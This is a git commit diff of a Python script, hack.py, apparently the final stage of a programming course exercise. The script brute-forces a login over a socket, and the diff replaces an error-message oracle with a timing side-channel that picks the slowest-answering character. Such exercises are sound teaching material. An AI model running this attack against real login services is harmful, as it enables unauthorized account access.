b83b2768b58a2326fcbcbd8f956a97de4d8da1ed
Konstantin <mr.kkaminsky@list.ru>
2020-05-14 17:49:38 +0500

    stage 5/5

--- hack.py
+++ hack.py
@@ -2,24 +2,34 @@ import sys
 import socket
 import string
 import json
+from datetime import datetime
 
 
 def get_pass(login, letters=""):
     alpha = string.ascii_letters + string.digits
+    differences = []
+    exit_flag = False
+    result = ''
     for ch in alpha:
         json_string1 = json.dumps({"login": login, "password": letters + ch})
+        start = datetime.now()
         client_socket.send(json_string1.encode())
         response1 = client_socket.recv(1024)
+        finish = datetime.now()
         response1 = response1.decode()
         decoded_data1 = json.loads(response1)
-        if decoded_data1["result"] == "Exception happened during login":
-            return get_pass(login, letters + ch)
-        elif decoded_data1["result"] == "Wrong password!":
-            continue
-        elif decoded_data1["result"] == "Connection success!":
-            return json_string1
-        else:
-            return "Something wrong"
+        difference = finish - start
+        if decoded_data1["result"] == "Connection success!":
+            exit_flag = True
+            result = json_string1
+            break
+        differences.append((difference, ch))
+    max_diff = max(differences)
+    if not exit_flag:
+        return get_pass(login, letters + max_diff[1])
+    else:
+        return result
+
 
 
 args = sys.argv
